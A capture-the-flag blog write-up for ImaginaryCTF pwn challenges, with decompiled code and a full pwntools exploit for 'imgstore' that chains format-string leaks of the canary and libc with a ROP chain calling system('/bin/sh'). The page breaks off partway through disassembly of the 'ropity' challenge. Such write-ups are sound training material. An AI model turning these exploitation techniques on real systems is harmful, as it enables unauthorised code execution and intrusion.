<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 3 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>nyyyddddn<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		快来和我贴贴qaq

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2024/08/01/ImaginaryCTF/" >ImaginaryCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2024-08-01  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="imgstore"><a href="#imgstore" class="headerlink" title="imgstore"></a>imgstore</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">sell_book</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+7h] [rbp-59h] BYREF</span>
  <span class="token keyword">int</span> buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-58h] BYREF</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-54h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-50h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>buf<span class="token punctuation">;</span>
  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book title: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">::</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token number">334873123</span> <span class="token operator">*</span> buf <span class="token operator">==</span> dword_6050 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      dword_608C <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
      <span class="token function">sub_1D77</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Sorry, we already have the same title as yours in our database; give me another book title."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token char">'y'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token operator">::</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[-] Exiting program..%s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[31m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_1D77</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-70h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_18F2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[/] UNDER DEVELOPMENT %s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[44m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s[!] SECURITY BREACH DETECTED%s\n"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[41m"</span><span class="token punctuation">,</span> <span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] BAD HACKER!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序中存在格式化字符串漏洞，和一个栈溢出漏洞，泄露地址后 直接改printf函数的返回地址然后打 rop就好了，就不需要任意地址写两次满足上面的约束，任意地址写的话，直接清空两个位置好像也行，&#x2F;dev&#x2F;urandom是真随机数，直接清空的话甚至不需要泄露</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"47.100.139.115"</span>
PORT <span class="token operator">=</span> <span class="token number">30708</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./imgstore'</span><span class="token punctuation">)</span>
<span class="token comment"># libc = elf.libc</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>

<span class="token comment"># elf - canary - stack</span>
payload <span class="token operator">=</span> <span class="token string">b"-%14$p-%17$p-%18$p"</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
elf_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x63cbb30f52b0</span> <span class="token operator">-</span> <span class="token number">0x63cbb30f3000</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
printf_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffdec097dc0</span> <span class="token operator">-</span> <span class="token number">0x7ffdec097d38</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b"-%10$s"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf_base <span class="token operator">+</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">"Book title --> "</span><span class="token punctuation">)</span>
ru<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
sla<span class="token punctuation">(</span><span class="token string">"Still interested in selling your book? [y/n]"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">b"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"c%10$hhn"</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">"title:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>

rdi <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x0000000000002313</span>
ret <span class="token operator">=</span> elf_base <span class="token operator">+</span> <span class="token number">0x000000000000101a</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x68</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>




p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ropity"><a href="#ropity" class="headerlink" title="ropity"></a>ropity</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               public main
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               main proc near                          <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> _start<span class="token operator">+</span><span class="token number">18</span>↑o
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               s<span class="token operator">=</span> byte ptr <span class="token operator">-</span><span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span>                               <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401136</span> F3 <span class="token number">0F</span> <span class="token number">1</span>E FA                   endbr64
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>A <span class="token number">55</span>                            push    rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>B <span class="token number">48</span> <span class="token number">89</span> E5                      mov     rbp<span class="token punctuation">,</span> rsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040113</span>E <span class="token number">48</span> <span class="token number">83</span> EC <span class="token number">10</span>                   sub     rsp<span class="token punctuation">,</span> <span class="token number">10</span>h
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401142</span> <span class="token number">48</span> <span class="token number">8</span>B <span class="token number">15</span> E7 <span class="token number">2</span>E <span class="token number">00</span> <span class="token number">00</span>          mov     rdx<span class="token punctuation">,</span> cs<span class="token operator">:</span>__bss_start             <span class="token punctuation">;</span> stream
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401149</span> <span class="token number">48</span> <span class="token number">8</span>D <span class="token number">45</span> F8                   lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>s<span class="token punctuation">]</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040114</span>D BE <span class="token number">00</span> <span class="token number">01</span> <span class="token number">00</span> <span class="token number">00</span>                mov     esi<span class="token punctuation">,</span> <span class="token number">100</span>h                       <span class="token punctuation">;</span> n
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401152</span> <span class="token number">48</span> <span class="token number">89</span> C7                      mov     rdi<span class="token punctuation">,</span> rax                        <span class="token punctuation">;</span> s
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401155</span> E8 E6 FE FF FF                call    _fgets
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401155</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>A <span class="token number">90</span>                            nop
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>B C9                            leave
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C C3                            retn
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C                               <span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// starts at 401136</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C                               main endp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>C
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> S U B R O U T I N E <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> Attributes<span class="token operator">:</span> bp<span class="token operator">-</span>based frame
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> <span class="token keyword">signed</span> __int64 __fastcall <span class="token function">printfile</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> __int64<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               public printfile
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               printfile proc near
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               var_8<span class="token operator">=</span> qword ptr <span class="token operator">-</span><span class="token number">8</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D                               <span class="token punctuation">;</span> __unwind <span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">000000000040115</span>D F3 <span class="token number">0F</span> <span class="token number">1</span>E FA                   endbr64
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401161</span> <span class="token number">55</span>                            push    rbp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401162</span> <span class="token number">48</span> <span class="token number">89</span> E5                      mov     rbp<span class="token punctuation">,</span> rsp
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401165</span> <span class="token number">48</span> <span class="token number">89</span> <span class="token number">7</span>D F8                   mov     <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_8<span class="token punctuation">]</span><span class="token punctuation">,</span> rdi
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401169</span> <span class="token number">48</span> C7 C0 <span class="token number">02</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rax<span class="token punctuation">,</span> <span class="token number">2</span>
<span class="token punctuation">.</span>text<span class="token operator">:</span><span class="token number">0000000000401170</span> <span class="token number">48</span> C7 C6 <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>          mov     rsi<span class="token punctuation">,</span> <span class="token number">0</span>                          <span class="token punctuation">;</span> flags
